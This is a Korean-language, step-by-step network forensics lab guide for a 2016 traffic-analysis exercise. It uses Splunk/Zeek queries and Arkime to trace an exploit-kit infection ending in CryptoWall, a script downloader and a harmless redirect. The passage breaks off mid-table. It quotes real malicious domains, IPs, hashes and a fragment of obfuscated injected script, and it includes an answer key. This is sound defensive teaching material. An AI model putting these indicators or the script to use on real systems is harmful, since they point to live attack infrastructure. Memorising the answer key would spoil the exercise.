---
title: Alerts on 3 different hosts — EK 드라이브바이에서 CryptoWall까지, 메일 JS 다운로더, 아무 일 없던 리다이렉트 (Splunk 중심, Arkime 보조)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - exploit-kit
  - cryptowall
  - ransomware
  - js-downloader
---

# Alerts on 3 different hosts — EK 드라이브바이에서 CryptoWall까지, 메일 JS 다운로더, 아무 일 없던 리다이렉트 { #alerts-3-hosts }

!!! abstract "사례 요약"
    malware-traffic-analysis.net의 **2016-01-07 "Alerts on 3 different hosts" 실습**을 홈 랩 **pcapbox** VM에서 따라 할 수 있게 쓴 가이드예요. 주 도구는 **Splunk**(Zeek 로그)이고, **Splunk로 내용을 볼 수 없을 때만 Arkime**를 써요. SOC 화면에 윈도우 7 PC 세 대의 "evil" 경보가 몇 분 사이에 떠요. 할 일은 PC마다 **무슨 일이 있었고 감염됐는지** 판단하는 거예요. 세 PC의 모습이 모두 달라서, 이 사례로 **진짜 감염과 아무 일 없이 끝난 경보를 구별하는 법**을 연습해요.

| | |
|---|---|
| **증거** | `2016-01-07-traffic-analysis-exercise.pcap` — 2016-01-07 22:05:47 – 22:17:18 UTC (약 11.5분) |
| **출처** | [malware-traffic-analysis.net 2016-01-07 "Alerts on 3 different hosts"](https://malware-traffic-analysis.net/2016/01/07/index.html) |
| **주어진 정보** | LAN 정보 없음. 대역, 게이트웨이, PC를 직접 찾아요 |
| **질문** | 시간 범위 · PC 세 대의 IP, MAC, 호스트 이름 · PC마다 무슨 일이 있었고 감염됐는지 · 후속 조치 권고 |
| **환경** | 폐쇄망. pcapbox VM: Splunk(`index=zeek`, 케이스 필드 `pcap_case`), Arkime(태그 = 케이스 이름), Snort 2.9.20. **Wireshark 사용 안 함.** |
| **케이스 이름** | `20160107_ALERTS_ON_3_DIFFERENT_HOSTS` |
| **관련 페이지** | [Sorting through the alerts(같은 방법, PC 한 대)](socgholish-fake-chrome-update-wscript-c2.md) · [피싱 미끼에서 EK 드라이브바이까지](phishing-red-herring-ek-driveby-ursnif-c2.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) |

!!! tip "이 페이지 쓰는 법"
    순서대로 따라 해요. 단계마다 **목적 → Splunk 쿼리(한 줄씩 설명) → 보여야 하는 결과 → 결과 읽기** 순서예요. Arkime는 Splunk로 페이지나 본문을 볼 수 없을 때만 나와요.

    결과 블록은 같은 PCAP으로 미리 뽑아 둔 값이에요. **호스트, 시간, URI, 크기는 정확히 같아야 해요. 합계(예: `conn` 줄 수)는 몇 개 다를 수 있어요.** 도구마다 UDP와 재시도 연결을 나누는 방식이 달라서예요. 핵심 줄이 다르면 멈추고 케이스 이름과 시간 범위부터 확인해요.

    표시: **[데이터]** = Splunk나 Arkime에서 본 것, **[추측]** = 아직 증명이 필요한 결론.

!!! warning "이 페이지의 지표는 실제 값이에요"
    도메인, IP, 해시는 2016년 실제 악성 트래픽에서 나온 값이에요. 본문과 표에서는 무력화(`hxxp`, `[.]`)했고, 코드 블록 안은 입력할 값 그대로예요. **절대 접속하지 마세요.** 추출한 것은 실행하지 마세요.

??? success "답 — 다 끝낸 뒤에만 열어 보세요"
    | PC | IP / MAC / 호스트 이름 | 무슨 일 | 감염? |
    |---|---|---|---|
    | A | 192.168.122.132 · 48:5b:39:c1:f2:48 · **Hokaydoo-PC** | 구글 검색 결과 → 해킹된 `www.koeppl[.]com` → `*.securetopc[.]top`의 익스플로잇 킷(Flash 익스플로잇, 암호화된 페이로드) → 해킹된 사이트들로 **CryptoWall** 체크인 → 사용자가 **"Decrypt service"** 몸값 페이지를 엶 | **예 — 랜섬웨어** |
    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | Yahoo 웹메일 → 6초 뒤 스크립트(`MSIE 7.0` User-Agent)가 해킹된 사이트 3곳에서 **`.gif`로 위장한** 윈도우 EXE를 6번 내려받음 | **예 — 악성코드 다운로드**(이후 통신은 안 보임) |
    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo 검색 → 스크립트가 심긴 `planetside.co[.]uk` → 게이트 `st.domandvilma[.]com`이 **빈 값**을 줌 → 아무 일도 없음 | **아니요** — 경보만 |

---

## 0단계 — PCAP 넣고 케이스 확인 { #prep }

**목적:** PCAP에 케이스 이름을 붙여서 다른 실습 로그와 절대 섞이지 않게 하고, 모든 도구를 **UTC**로 맞춰요.

1. 파일 이름을 **`20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap`**으로 바꾸고 `\\10.50.10.60\incoming`에 복사해요.
2. pcapbox에서 `tail -f /data/logs/ingest.log`를 보다가 `DONE case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS`가 나오면 끝이에요. **한 번만 넣어요.** 다시 넣으면 로그가 모두 두 번 들어가요.
3. Splunk **Preferences → Time zone = UTC**, Arkime **Settings → Timezone = UTC**, 시간 범위 **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — Zeek 로그가 든 인덱스(Splunk의 "서랍")만 봐요.
- `sourcetype=zeek:conn` — 연결 로그예요. 연결 하나가 한 줄이에요.
- `|` — 왼쪽 결과를 다음 명령으로 넘겨요.
- `stats count by pcap_case` — 케이스 이름마다 줄 수를 세요. 새 케이스가 목록에 있어야 해요.

!!! note "시간은 `ts`"
    Zeek의 이벤트 시간은 **`ts`**(epoch 초)예요. 쿼리는 모두 `ts`로 정렬하고 출력해요. `eval t=strftime(ts,"%H:%M:%S")`로 읽기 쉽게 바꿔요.

---

## 1단계 — 베이스라이닝: 이 캡처의 평소 모습 { #baseline }

베이스라이닝 = **평소 모습**을 먼저 아는 거예요. 시간 범위, 로그 종류, 어떤 PC가 있는지, 누구인지, 보통 어떻게 웹을 쓰는지. 그래야 "이상한 것"이 눈에 띄어요.

### 1-1. 어떤 로그가 있나 { #log-types }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats count by sourcetype
| sort - count
```

- `sourcetype`을 안 적어서 이 케이스의 **모든 로그 종류**를 가져와요. `sort - count` = 많은 순서.

**보여야 하는 결과(정확한 숫자가 아니라 순서):** `zeek:conn`, `zeek:dns`, `zeek:http`(약 325줄), `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, 있으면 `zeek:weird`, `zeek:pe`.

**[데이터] 결과 읽기:**

- **`zeek:dhcp`가 있어요.** 캡처 중에 PC들이 IP를 요청했다는 뜻이라, DHCP로 이름, MAC, IP를 바로 알 수 있어요(1-4).
- **`kerberos`, `ldap`, `smb_*`가 없어요.** AD 도메인이 없어요. 혼자 쓰는 PC들이라 찾을 사용자 이름도 없어요.
- **`zeek:http`가 많아요.** 내용을 다 읽을 수 있는 평문 웹 통신이 많다는 뜻이라 이번 사례엔 좋은 소식이에요.
- **`zeek:pe`**(있다면)는 Zeek가 **통신 안에서 윈도우 프로그램**(EXE/DLL)을 봤다는 뜻이에요. 평범한 사무실 캡처에선 드물어요. 메모해요.

### 1-2. 캡처 시간 범위 { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- 2줄: 한 줄로 요약해요 — 가장 이른 연결 시작, 가장 늦은 연결 시작, 연결 수. `as`는 결과에 이름을 붙여요.
- 3줄: 분 단위, 소수 한 자리. **4줄보다 먼저** 와야 해요. 4줄을 지나면 `first`/`last`가 글자가 돼서 뺄셈을 못 해요.
- 4줄: epoch → 읽을 수 있는 날짜.

**보여야 하는 결과:** `first` **2016-01-07 22:05:47**, `last` 약 **22:17**(마지막 연결의 **시작** 시각이에요. 마지막 패킷은 22:17:18), 약 **11.5분**, 연결 약 470개.

### 1-3. 어떤 내부 IP가 연결을 시작하나 { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.0.0/16
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h
| eval first=strftime(first,"%H:%M:%S")
| sort first
```

- `id_orig_h` = 연결을 **시작한** IP(`orig` = 시작한 쪽, `resp` = 받은 쪽, `_h` = IP, `_p` = 포트).
- `id_orig_h=192.168.0.0/16` — Splunk는 IP 필드에 대역(CIDR)을 쓰면 알아서 맞춰 봐요. 192.168.x.x 사설 IP만 남겨요.
- `dc()` = 중복 빼고 세기. `orig_bytes` / `resp_bytes` = 양쪽이 보낸 데이터 바이트.

**보여야 하는 결과(숫자는 대략):**

```text
id_orig_h         sessions  destinations  first
192.168.122.130   ~130      ~30           22:05:51
192.168.122.52    ~220      ~25           22:06:06
192.168.122.132   ~120      ~25           22:06:25
(192.168.122.1은 DHCP 응답 때문에 한두 줄 나오거나 안 나올 수 있어요)
```

**[데이터] 결과 읽기:**

- **LAN = 192.168.122.0/24.** PC 세 대: **.130, .52, .132**.
- **192.168.122.1**은 연결을 거의 시작하지 않아요. **게이트웨이, DHCP 서버, DNS 서버**예요(1-4와 1-6에서 확인).
- 세 PC가 차례로 시작해요(22:05:51, 22:06:06, 22:06:25). 캡처 시작 무렵에 켜졌어요.

### 1-4. 누가 누구인가 — DHCP { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval t=strftime(ts,"%H:%M:%S")
| table t client_addr assigned_addr mac host_name msg_types server_addr
| sort t
```

- `zeek:dhcp` = DHCP 주고받기 한 번이 한 줄. `assigned_addr` = 서버가 준 IP, `mac` = PC의 네트워크 카드, `host_name` = PC가 보낸 이름(DHCP 옵션 12).
- `msg_types`: **REQUEST/ACK** = "이 IP 써도 돼요?" / "네", **INFORM/ACK** = "IP는 있어요, 설정만 주세요".

**보여야 하는 결과:**

```text
t         client_addr      assigned_addr    mac                 host_name         msg_types
22:05:47                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:54  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
22:06:02                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:10  192.168.122.52                    00:26:55:32:a9:17   Jennifer-PC       INFORM ACK
22:06:21                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:29  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
...       (.132가 22:10:45에, .130이 22:11:53에 INFORM을 한 번 더 보냄)
```

**[데이터] 결과 읽기:** 이름 셋, MAC 셋, IP 셋이에요. `server_addr`는 **192.168.122.1**이에요. 실습 질문 2번의 답이에요.

| IP | MAC | 호스트 이름 |
|---|---|---|
| 192.168.122.130 | 00:22:19:e2:4b:86 | FULL-METAL-JACK |
| 192.168.122.52 | 00:26:55:32:a9:17 | Jennifer-PC |
| 192.168.122.132 | 48:5b:39:c1:f2:48 | Hokaydoo-PC |

!!! question "질문: .132와 .130은 왜 나중에 DHCP INFORM을 한 번 더 보냈나요?"
    무언가 네트워크 설정을 다시 물으면 윈도우가 INFORM을 보내요. 새 네트워크 확인이나 프로그램 시작 같은 때예요. 그것만으로는 아무 뜻이 없어요. 시간(22:10:45, 22:11:53)을 메모해 두고 그 무렵에 다른 일이 있는지 봐요. (힌트만: 둘 다 3단계와 4단계의 중요한 일과 몇 초 차이예요.)

### 1-5. 각 PC가 쓰는 프로그램 — User-Agent { #user-agents }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(host) as sites by id_orig_h user_agent
| sort id_orig_h first
```

- `user_agent` = HTTP 요청마다 프로그램이 스스로 밝히는 이름이에요. 브라우저에 하나, 다른 프로그램은 자기 것이 있어요.
- `eval host=mvdedup(host)` — `host` 값을 하나만 남겨요(pcapbox Splunk가 예전에 두 번 저장하던 문제. 습관으로 넣어도 해가 없어요).
- `stats … by id_orig_h user_agent` = **PC + 프로그램** 짝마다 한 줄.

**보여야 하는 결과:**

```text
id_orig_h        user_agent                                                                  first     count  sites
192.168.122.130  Microsoft NCSI                                                              22:05:58  1      1
192.168.122.130  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)            22:07:00  1      1
192.168.122.130  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; ...)  22:11:53  9      3
192.168.122.132  Microsoft NCSI                                                              22:06:33  1      1
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  81     9
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR ...; rv:11.0) like Gecko  22:10:26  1  1
192.168.122.132  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)  22:10:47  4      2
192.168.122.52   Microsoft NCSI                                                              22:06:13  1      1
192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  ~190   ~15
```

**[데이터] 결과 읽기:**

- 셋 다 `Windows NT 6.1` = **윈도우 7**이에요. `Microsoft NCSI` = 켜질 때 윈도우가 "인터넷 되나?" 확인하는 것 — 정상이에요.
- 브라우저: .130 **IE 10**, .52 **IE 9**, .132 **IE 11**(`Trident/7.0; rv:11.0`, 64비트 윈도우: `WOW64`).
- **PC 두 대에 나중에 "MSIE 7.0"이 나와요**(.130 22:11:53, .132 22:10:47). IE 7은 2006년 브라우저예요. 윈도우 7에서 이 이름은 **스크립트와 프로그램이 쓰는 윈도우 자체 HTTP 객체**(WScript, 많은 악성코드)의 기본 User-Agent예요. **사용자의 브라우저가 아니에요.** 후보예요.
- **.132에 한 번만 쓰인 세 번째 User-Agent**(22:10:26)가 있어요. `.NET CLR`이 더 붙은 IE 11이에요. 다른 프로그램이 그 요청 하나를 했어요. 후보예요.

### 1-6. DNS 서버 { #dns-servers }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_resp_p=53
| stats count by id_orig_h id_resp_h
```

**보여야 하는 결과:** .130과 .52는 **192.168.122.1**에 물어요. **.132는 8.8.8.8과 8.8.4.4**(구글)에 물어요. [데이터] 누군가 .132의 DNS를 손으로 바꿨어요. 그 자체가 악성은 아니지만, 게이트웨이의 DNS 로그로는 .132의 조회를 **못 본다**는 뜻이라 보고서에 한 줄 쓸 만해요.

**베이스라인 메모 — 후보만, 결론은 아직:**

1. 22:10:26 — .132, 한 번만 쓰인 IE 11 변형 User-Agent
2. 22:10:47 — .132, `MSIE 7.0`
3. 22:11:53 — .130, `MSIE 7.0`

---

## 2단계 — PC마다 어디를 갔나: 정상 지우기 { #triage }

### 2-1. PC별 HTTP 사이트, 시간 순서 { #http-per-pc }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host
| sort id_orig_h first
```

- `host` = HTTP Host 헤더(사이트 이름). `method`: **GET** 가져오기, **POST** 보내기.
- `response_body_len` = 서버가 돌려준 바이트(압축을 푼 뒤).

**보여야 하는 결과(핵심 줄):**

```text
id_orig_h        host                                     first     count  methods    received
192.168.122.130  www.msftncsi.com                         22:05:58  1      GET
192.168.122.130  mail.yahoo.com                           22:07:00  1      GET
192.168.122.130  ma-wt.com.sa                             22:11:53  3      GET        375301
192.168.122.130  dariostoka.com                           22:11:55  3      GET        375301
192.168.122.130  freshanointingministries-sc.org          22:11:57  3      GET        406541
192.168.122.132  www.msftncsi.com                         22:06:33  1      GET
192.168.122.132  www.google.com.au                        22:10:08  1      GET
192.168.122.132  www.koeppl.com                           22:10:10  55     GET
192.168.122.132  translate.google.com / pbs.twimg.com / stats.g.doubleclick.net / joomla-gtranslate.googlecode.com   (각 1개)
192.168.122.132  uacltr.securetopc.top                    22:10:15  3      GET        84264
192.168.122.132  gbesbsdsb.securetopc.top                 22:10:23  2      GET        421888
192.168.122.132  bizsouls.com                             22:10:47  3      POST       123682
192.168.122.132  estudiobarco.com.ar                      22:12:14  1      POST       6
192.168.122.132  3wzn5p2yiumh7akj.waytopaytosystem.com    22:16:46  17     GET POST
192.168.122.52   www.msftncsi.com                         22:06:13  1      GET
192.168.122.52   au.search.yahoo.com / l.yimg.com / ri.search.yahoo.com   22:08:49   (Yahoo 검색)
192.168.122.52   planetside.co.uk                         22:09:12  ~80    GET POST
192.168.122.52   st.domandvilma.com                       22:09:24  1      GET        26
192.168.122.52   ajax.googleapis.com / ajax.aspnetcdn.com / www.google-analytics.com   (사이트 구성 파일)
192.168.122.52   www.outdoorsamoa.com / www.tripadvisor.com / fonts.* / static.tacdn.com   22:15:29 …
```

**정상을 지우는 방법:**

1. 윈도우 자체: `msftncsi.com`.
2. 잘 아는 큰 서비스와 그 부속: 구글(`google.*`, `gstatic`, `googleapis`, `google-analytics`, `doubleclick`), Yahoo(`yahoo.com`, `yimg.com`), 트위터(`twimg.com`), 마이크로소프트 CDN(`aspnetcdn.com`), 트립어드바이저(`tripadvisor.*`, `tacdn.com`, `jscache.com`).
3. 사용자가 분명히 고른 사이트(검색 결과, 직접 친 주소)와 그 사이트가 자기 이름으로 불러오는 파일.

**[데이터] 남는 것:**

| PC | 남은 것 | 이상한 이유 |
|---|---|---|
| .132 | `uacltr.securetopc.top`, `gbesbsdsb.securetopc.top` | `.top` 도메인에 아무렇게나 만든 하위 이름, 정상 사이트 몇 초 뒤 |
| .132 | `bizsouls.com`, `estudiobarco.com.ar` | **POST만**, `MSIE 7.0` 프로그램(후보 2)이 보냄 |
| .132 | `3wzn5p2yiumh7akj.waytopaytosystem.com` | 무작위 16글자 + "way to pay to system(돈 내는 시스템)" |
| .130 | `ma-wt.com.sa`, `dariostoka.com`, `freshanointingministries-sc.org` | 서로 관계없는 사이트 셋에 같은 3번 요청, 각 약 375–406 KB, `MSIE 7.0`(후보 3)이 보냄 |
| .52 | `st.domandvilma.com` | 사용자가 연 사이트의 일부가 아님. 받은 건 **26바이트**뿐 |

### 2-2. DNS 없이 간 목적지 — 여기선 왜 안 나오나 { #no-dns }

지난 사례에서는 이 쿼리로 C2를 찾았어요. 해 보세요. **방법이 아무것도 못 찾을 때를 아는 것**도 실력이에요.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.0/24 proto=tcp NOT id_resp_h=192.168.0.0/16
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| stats count by id_orig_h id_resp_h id_resp_p
```

- `[ … ]` **서브서치**가 먼저 실행돼서 DNS 답에 나온 IP를 모두 모아요(`mvexpand` = 값마다 한 줄, `rename` = conn 필드 이름과 맞추기). `NOT`이 붙어서 **한 번도 조회하지 않은** TCP 목적지만 남아요.

**보여야 하는 결과:** **결과 없음.** [데이터] 외부 TCP 목적지는 모두 이름으로 찾아갔어요. 이 캡처의 악성 활동은 모두 **도메인**을 써요. 그래서 "하드코딩된 IP"를 찾는 것보다 HTTP와 DNS(2-1)를 보는 게 맞아요.

**계획:** PC 하나씩, 심각해 보이는 순서로: **.132**(이상한 통신이 세 종류) → **.130** → **.52**.

---

## 3단계 — PC A: 192.168.122.132 Hokaydoo-PC { #pc-a }

### 3-1. Referer로 이어 보기 { #pc-a-chain }

**Referer** 헤더는 "나는 이 페이지에서 왔어요"라는 뜻이에요. 따라가면 어떤 페이지가 무엇을 불렀는지 이어져요. (HTTP 철자는 *Referer*, Zeek 필드 이름은 `referrer`예요.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 ts>=1452204600
| eval host=mvdedup(host)
| search NOT host IN ("*google*","*twimg.com","*doubleclick.net","*googlecode.com") NOT uri="*.css*" NOT uri="*.png*" NOT uri="*.jpg*" NOT uri="*.gif*" NOT uri="*.js*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- `ts>=1452204600` = **22:10:00 UTC**부터(epoch 초. `| makeresults | eval x=strftime(1452204600,"%H:%M:%S")`로 확인할 수 있어요).
- `host IN ("*google*", …)` — `IN`에 `*`를 쓸 수 있어요. `NOT`과 함께 잡음을 숨겨요(2-1에서 본 22:10:08의 구글 결과 클릭 `www.google.com.au/url?…url=http%3A%2F%2Fwww.koeppl.com%2F`도 숨겨져요). `uri` 조건은 정상 사이트의 이미지, 스타일, 스크립트를 숨겨요.
- `resp_mime_types` = 서버가 붙인 이름표가 아니라 Zeek가 **내용을 보고** 판단한 형식.

**보여야 하는 결과:**

```text
t              host                         uri                                                        referrer                                              status  resp_mime_types              response_body_len
22:10:10.863   www.koeppl.com               /                                                          http://www.google.com.au/url?sa=t&rct=j…            200     text/html                    62939
22:10:15.930   uacltr.securetopc.top        /1993/10/14/madness/willow/dick-sort-southward-swallow.html http://www.koeppl.com/                               200     text/html                    1035
22:10:16.598   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            -       -                            0
22:10:17.300   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            200     application/x-shockwave-flash 83229
22:10:23.164   gbesbsdsb.securetopc.top     /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock   http://uacltr.securetopc.top/1993/10/14/…   200     -       0
22:10:26.229   gbesbsdsb.securetopc.top     /officer/1277929/tidings-humble-communication              -                                                     200     - (또는 application/octet-stream)  421888
22:10:47.545   bizsouls.com                 /XG3vxT.php?y=21657wkalasvbb                               -                                                     200     text/plain                   14
22:10:51.876   bizsouls.com                 /XG3vxT.php?c=a2py731nhw                                   -                                                     200     text/plain                   123668
22:11:11.746   bizsouls.com                 /XG3vxT.php?o=py8nr3ezh06q03o                              -                                                     200     -                            0
22:12:14.456   estudiobarco.com.ar          /5TFv7E.php?z=py8nr3ezh06q03o                              -                                                     200     text/plain                   6
22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                        -                                                     200     text/html                    3289
22:16:49.853   3wzn5p2yiumh7akj.waytopaytosystem.com   /picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155   http://3wzn5p2yiumh7akj…/1f96s0p          200     image/…
22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                               http://3wzn5p2yiumh7akj…/1f96s0p                     200     text/html                    14463
```

**[데이터] 한 줄씩 읽기:**

1. **22:10:08–10 — 사용자가 구글 검색 결과**에서 `www.koeppl.com`(독일 모터 장비 가게)을 눌렀어요. 정상 방문이고 Referer = 구글이에요.
2. **22:10:15 — koeppl 페이지가 낯선 서버를 불렀어요.** `uacltr.securetopc.top`의 **Referer가 `http://www.koeppl.com/`**이에요. koeppl 페이지 안의 무언가가 브라우저를 그리로 보냈어요. **[추측]** 사이트가 **해킹**됐어요(3-2에서 증명).
3. **경로가 날짜와 아무 단어로 만든 블로그 글 같아요**(`/1993/10/14/madness/willow/…html`). 경로의 아무 단어, 싼 `.top` 도메인, IP 하나에 무작위 하위 이름 둘 — 2015년 말~2016년 초 **익스플로잇 킷(EK)** 랜딩 페이지의 전형적인 모습이에요.
4. **22:10:16–17 — 랜딩 페이지가 Flash 파일**(`.swf`, 83 KB)을 불렀어요. 첫 요청은 답이 없어서 브라우저가 다시 물었어요. EK는 Flash 버그를 써서 페이지를 보기만 해도 코드를 실행했어요.
5. **22:10:26 — Referer 없이, 다른 User-Agent로 421,888바이트**(후보 1). 브라우저가 아니라 **익스플로잇 코드가** 페이로드를 내려받은 거예요. Zeek가 **형식을 못 찾아요** — 페이로드가 오는 동안 **암호화**돼 있고(PC에서 풀어요) `MZ`로 시작하지 않아서예요.
6. **22:10:47 — 21초 뒤 새 프로그램(`MSIE 7.0`, 후보 2)이 `bizsouls.com`에 POST**를 세 번, 그다음 `estudiobarco.com.ar`에 해요. 아무렇게나 지은 `.php` 이름에 한 글자 파라미터, 짧은 **hex 글자** 응답 — **해킹된 웹사이트를 C2 중계소로 쓰는** 악성코드 체크인이에요.
7. **22:16:46 — `…waytopaytosystem.com` 페이지**를 브라우저(IE 11 User-Agent)가 열었어요. 사용자가 PC 어딘가에 있던 주소를 치거나 눌렀어요. 3-4에서 무엇인지 봐요.

!!! question "질문: 22:10:45의 DHCP INFORM은 무슨 뜻인가요?"
    1-4를 다시 보면 .132가 **22:10:45**에 DHCP INFORM을 보냈어요. 첫 `MSIE 7.0` POST(22:10:47) **2초 전**이에요. 막 시작한 프로그램이 윈도우에 네트워크 설정을 묻는 것과 맞아요. 페이로드가 실행됐다는 걸 뒷받침하지만 증명하지는 않아요.

### 3-2. 해킹된 사이트 — `<html>` 앞에 심긴 코드 (Arkime) { #pc-a-inject }

Zeek는 요약만 남기고 **페이지 내용은 안 남겨요**. Arkime에서 koeppl 페이지를 열어요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
```

세션을 펼치고(`+`) **natural**과 **uncompress**를 켠 다음 **응답 본문**까지 내려가요(전송 중엔 gzip으로 압축돼 있어요).

```text
<style>.kjpxhkghapgcgt { position: absolute; top: -1357px; left: -1125px}</style>
<div id="nvjgnbocfpotc" class="kjpxhkghapgcgt">a fa e bceid: fb, ocdbf ekdjcpajdcaecrbqbxcpbsed a ucdbdcp b j; dgahaacsera z 'b' ubmaoa ...</div>
<script>
var pxzqxmmylyy=(563738144>878824873?"\x65":"re");
var scestqiccnik=(75811078+892246232<544535642+1517287702?"\x72\x65":"px");
...
</script>
<!DOCTYPE html ...>
<html ...>
```

**[데이터] 결과 읽기:**

- 진짜 웹 페이지는 `<!DOCTYPE html>`이나 `<html>`로 시작해요. 여기는 **약 25 KB의 쓰레기가 먼저** 나와요. `<div>`를 화면 밖 멀리(`top:-1357px`) 보내는 `<style>`과 엉터리 글자로 가득한 `<div>`예요.
- 그다음 `<script>`가 작은 조각으로 단어를 만들어요(`"re"+"turn Str"+"ing"` …). **난독화**예요. "securetopc"라는 단어가 평문으로 안 나오게 하려는 거예요.
- 스크립트가 숨긴 글자를 읽어서 랜딩 페이지 주소로 바꿔요. **[데이터]** 그래서 브라우저가 Referer `koeppl.com`을 달고 `uacltr.securetopc.top`으로 갔어요.

풀 필요는 없어요. 바로 다음 요청(Referer = koeppl, 5초 뒤)이 어디로 갔는지 이미 보여 줘요. **정상 사이트의 `<html>` 앞에 있는 코드 = 심긴 코드.**

### 3-3. 익스플로잇 킷과 페이로드 — 파일 (Splunk) { #pc-a-files }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS tx_hosts="89.38.144.75"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `zeek:files` = Zeek가 통신에서 본 파일 하나가 한 줄. `tx_hosts` = 보낸 쪽, `rx_hosts` = 받은 쪽, `mime_type` = **내용으로** 판단한 형식, `md5` = 지문.
- `89.38.144.75` = `securetopc.top` 두 이름의 서버예요(확인: `index=zeek sourcetype=zeek:dns query="*securetopc.top" | table ts query answers`).

**보여야 하는 결과:**

```text
t         tx_hosts      rx_hosts         mime_type                       seen_bytes  md5
22:10:15  89.38.144.75  192.168.122.132  text/html                       1035        946f2af6be0d796430b590ad5ee48be5
22:10:17  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
22:10:26  89.38.144.75  192.168.122.132  (빈칸)                          421888      dd5ecd6f928fc4f988996feb5b292879
```

**[데이터] 결과 읽기:** Flash 익스플로잇 → 암호화된 페이로드(형식 없음, 약 412 KB). 페이로드 MD5는 **암호화된** 바이트의 해시이지 디스크에 있는 프로그램의 해시가 아니에요. 악성코드 데이터베이스에서 찾아도 보통 안 나와요.

**[추측] 어떤 익스플로잇 킷?** 날짜+단어 경로, `.html.swf` 이름, 무작위 하위 이름 둘이 있는 `.top` 도메인, 단어+숫자+단어로 된 페이로드 경로, 암호화된 페이로드 — 2016년 1월 **Neutrino EK**의 모습과 같아요. 원래 실습은 IDS 경보로 EK를 확인했는데, 여기엔 경보가 없어요. "EK(Neutrino와 모양이 같음)"라고 쓰고 확정된 이름으로 쓰지 않아요.

### 3-4. 페이로드 다음: 체크인과 몸값 페이지 { #pc-a-post }

**체크인 (Splunk):**

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h host uri user_agent request_body_len response_body_len
```

```text
t         id_resp_h        host                                   uri                             request_body_len  response_body_len
22:10:47  188.138.101.154  bizsouls.com                           /XG3vxT.php?y=21657wkalasvbb    131               14
